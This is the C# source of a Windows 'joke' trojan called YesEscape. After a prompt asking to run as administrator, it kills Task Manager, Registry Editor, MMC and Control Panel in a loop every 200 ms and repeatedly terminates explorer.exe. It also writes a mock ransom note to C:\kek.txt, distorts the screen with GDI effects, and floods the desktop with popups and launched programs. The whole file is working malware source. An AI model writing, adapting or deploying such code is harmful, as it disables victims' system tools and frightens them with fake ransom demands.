using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;

namespace YesEscape
{
    internal static class Program
    {
        #region imports
        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, uint rop);

        public static uint SRCAND = 0x008800C6;

        #region msgbox variables
        public static MessageBoxButtons OK = MessageBoxButtons.OK;
        public static MessageBoxButtons OKcancel = MessageBoxButtons.OKCancel;
        public static MessageBoxButtons YesNo = MessageBoxButtons.YesNo;
        public static MessageBoxButtons YesNoCancel = MessageBoxButtons.YesNoCancel;
        public static MessageBoxButtons AbortRetryIgnore = MessageBoxButtons.AbortRetryIgnore;
        public static MessageBoxButtons RetryCancel = MessageBoxButtons.RetryCancel;

        public static MessageBoxIcon Hand = MessageBoxIcon.Hand;
        public static MessageBoxIcon Error = MessageBoxIcon.Error;
        public static MessageBoxIcon Warning = MessageBoxIcon.Warning;
        public static MessageBoxIcon Question = MessageBoxIcon.Question;
        public static MessageBoxIcon Information = MessageBoxIcon.Information;
        public static MessageBoxIcon None = MessageBoxIcon.None;

        public static MessageBoxDefaultButton button1 = MessageBoxDefaultButton.Button1;
        public static MessageBoxDefaultButton button2 = MessageBoxDefaultButton.Button2;
        public static MessageBoxDefaultButton button3 = MessageBoxDefaultButton.Button3;

        public static MessageBoxOptions DefaultDesktopOnly = MessageBoxOptions.DefaultDesktopOnly;
        public static MessageBoxOptions RightAlign = MessageBoxOptions.RightAlign;
        public static MessageBoxOptions ServiceNotification = MessageBoxOptions.ServiceNotification;
        public static MessageBoxOptions RtlReading = MessageBoxOptions.RtlReading;
        #endregion

        static Random r = new Random();
        static IntPtr NULL = IntPtr.Zero;
        #endregion

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            if (MessageBox.Show(

                "hello\n" +
                "this is a cool epic not a malware\n" +
                "i promise i didn't use batch or vbs\n" +
                "do you want to execute my not a virus?\n" +
                "also plz plz plzsllzlzlz make sure to run as adminitrstator",

                "YesEscape", YesNo, Warning) == DialogResult.Yes)
            {
                threads();
            }
            else
            {
                MessageBox.Show("fym no", ":(", OK, Error);
                Environment.Exit(0);
            }
        }

        static void threads()
        {
            Thread gdi = new Thread(GDI);
            Thread pop_ups = new Thread(popups);

            Application.VisualStyleState = System.Windows.Forms.VisualStyles.VisualStyleState.NonClientAreaEnabled;

            Thread.Sleep(300);

            Functions.MessageBoxThread(

                    "This program was made with an Unlicensed compiler.\n" +
                    "Please buy the PRO version to distribute your EXE."

            );
            new Thread(killProcesses).Start();

            Thread.Sleep(59700);

            Application.VisualStyleState = System.Windows.Forms.VisualStyles.VisualStyleState.ClientAndNonClientAreasEnabled;

            try
            {
                File.WriteAllText("C:\\kek.txt",

                    "hello\n" +
                    "your pc is now consumed by the NoEscape trojan virus\n" +
                    "your pc is now gone forever\n" +
                    "next time be more careful pirating protegent or solaris - proto doesn't like this\n" +
                    "remember - there's no such thing as \"free solaris\"\n" +
                    "pay 1 (one) dorito to continue"

                );
            }
            catch (Exception ex)
            {
                MessageBox.Show("failed to create file, the program will exit\n\n" + ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                Environment.Exit(0);
            }
            Process.Start("notepad.exe", "C:\\kek.txt");

            Thread.Sleep(10000);

            gdi.Start();
            pop_ups.Start();

            new Thread(killExplorer).Start();

            Process.Start("cmd.exe");
            Process.Start("mspaint.exe");
            Process.Start("calc.exe");

            Functions.MessageBoxThread("Silence.", "Eslash_Sdot.10", OK, Warning);

            Thread.Sleep(120000);

            new Thread(() => Application.Run(new Escape())).Start();
            new Thread(() => Application.Run(new escape_notification())).Start();

            Thread.Sleep(60000);

            gdi.Abort();
            pop_ups.Abort();
        }

        static void GDI()
        {
            int speed = 1500;

            while(true)
            {
                IntPtr hdc = GetDC(NULL);
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;

                BitBlt(hdc, r.Next(-1, 1), r.Next(-1, 1), w, h, hdc, 0, 0, SRCAND);

                Thread.Sleep(speed);
                if(speed > 300)
                {
                    speed -= 25;
                }

                DeleteDC(hdc);
            }
        }

        static void popups()
        {
            while(true)
            {
                Thread.Sleep(r.Next(10000));
                new Thread(() => Application.Run(new popup())).Start();
            }
        }

        static void killProcesses()
        {
            while (true)
            {
                Functions.CMD("taskkill /f /im taskmgr.exe");
                Functions.CMD("taskkill /f /im regedit.exe");
                Functions.CMD("taskkill /f /im mmc.exe");
                Functions.CMD("taskkill /f /im control.exe");

                Thread.Sleep(200);
            }
        }

        static void killExplorer()
        {
            while (true)
            {
                Functions.CMD("taskkill /f /im explorer.exe");

                Thread.Sleep(200);
            }
        }
    }
}
